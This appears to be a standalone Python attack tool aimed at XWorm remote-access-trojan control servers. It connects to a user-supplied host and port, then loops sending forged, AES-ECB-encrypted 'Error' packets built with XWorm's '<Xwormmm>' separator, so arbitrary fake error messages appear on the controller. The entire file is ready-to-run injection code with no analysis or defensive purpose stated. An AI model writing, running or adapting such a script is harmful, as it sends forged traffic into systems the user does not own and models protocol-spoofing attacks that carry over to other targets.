
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import hashlib
import socket
import os

class FloodErrorUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = FloodErrorUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class FloodError:
    SPL_XCLIENT = "<Xwormmm>" # Separator constant, used in all XWorm Versions as far as i know

    @staticmethod
    def main():
        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = FloodError.connection(host, port) # Connect to target
        while True:
            msg = input("Fake error Message > ") # Get fake error message
            FloodError.trigger(msg, sock, key) # Trigger the fake error


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(msg, sock, key):
        try:
            payload = f"Error{FloodError.SPL_XCLIENT} ➔ {msg}" # Create fake error message
            FloodErrorUtils.send_encrypted(sock, payload, key) # Send encrypted message
            print("Fake error message sent.")
        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    FloodError.main() # Run the main function